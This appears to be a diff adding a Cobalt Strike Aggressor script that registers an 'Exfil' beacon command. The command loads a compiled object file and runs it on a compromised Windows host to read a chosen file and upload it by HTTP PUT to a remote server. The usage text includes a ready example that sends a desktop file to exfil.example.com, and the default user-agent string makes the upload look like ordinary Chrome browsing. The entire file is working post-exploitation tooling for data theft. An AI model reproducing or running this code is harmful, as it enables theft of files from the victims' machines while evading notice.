@@ -1,0 +1,81 @@
+beacon_command_register(
+"Exfil",
+"Reads file and performs PUT request to a specified site",
+"Usage: Exfil --File <filepath> --Site exfil.example.com --URI /exfil/ < --UserAgent CustomString > \
+Exfil Example: \
+   Exfil --File C:\\Users\\Test\\Desktop\\important.txt --Site exfil.example.com --URI /exfil/path/customfilename.txt --UserAgent Exfil-Test \
+Exfil Options: \
+    --File, path to file for exfil \
+    --Site, the server to perform the PUT request to \ 
+    --URI, the path on the server to perform the PUT request to \
+    --UserAgent, Optional useragent string to add to request \ 
+    ");
+
+# $1 - beacon id
+# $2 - args
+
+alias Exfil {
+    local('$handle $data $args $File $Site $UserAgent $all');
+
+    # read in our BOF file...   
+    $handle = openf(script_resource("exfil.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read bof file");
+        return;
+    }
+
+    # declare variables
+    $File = "";
+    $Site = "";
+    $URI = "";
+    $UserAgent = "";
+
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--File"){
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --File value");
+                return;
+            }else{
+                $File = @_[$i];
+            }
+        }
+        if (@_[$i] eq "--Site"){
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --Site value");
+                return;
+            }else{
+                $Site = @_[$i];
+            }
+        }
+        if (@_[$i] eq "--URI"){
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing --URI value");
+                return;
+            }else{
+                $URI = @_[$i];
+            }
+        }
+        if (@_[$i] eq "--UserAgent"){
+            $i++;
+            if($i >= size(@_))
+            {
+                $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
+            }else{
+                $UserAgent = @_[$i];
+            }
+        }
+    }
+    $args = bof_pack($1, "zzzz",$Site,$File,$URI,$UserAgent);
+    beacon_inline_execute($1, $data, "go", $args);
+}
